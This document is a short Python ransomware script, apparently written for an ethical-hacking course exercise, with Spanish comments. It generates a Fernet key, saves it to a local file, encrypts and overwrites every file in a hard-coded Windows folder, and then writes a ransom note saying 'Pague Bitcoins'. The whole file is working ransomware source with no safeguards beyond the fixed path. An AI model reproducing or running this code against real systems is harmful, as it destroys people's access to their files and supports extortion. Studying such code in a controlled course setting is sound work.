#cifradoRansomwareHarrisoMontoya

from cryptography.fernet import Fernet
import os

#Extension de los archivos
#extension= 'IUEHackeoEtico202302'

#Generacion de la llave de cifrado
def generar_key():
    key= Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)

#Cargar la llave generada
def cargar_key():
    return open('key.key','rb').read()

#Cifrar y renombrar los archivos
def cifrar(items,key):
    f=Fernet(key)
    for item in items:
        #le el archivo
        with open(item,'rb') as file:
            file_data=file.read()

        encrypted_data=f.encrypt(file_data)

        #escribo el archivo
        with open(item,'wb') as file:
            file.write(encrypted_data)

        os.rename(item,item)
        #os.rename(item,item + '.' + extension)


if __name__=='__main__':
     path_to_encrypt='C:/Users\Harrison Montoya V\OneDrive - IUE\Semestre 3\HackeoEtico\Ejercicio 3\CifradoRansomPyHarrisonMontoya\DatosCifradoDesifrado'
     items=os.listdir(path_to_encrypt)
     full_path=[path_to_encrypt+'\\' + item for item in items]
     generar_key()
     key=cargar_key()   
     cifrar(full_path,key)

     with open(path_to_encrypt + '\\README.txt','w') as file:
        file.write('Pague Bitcoins')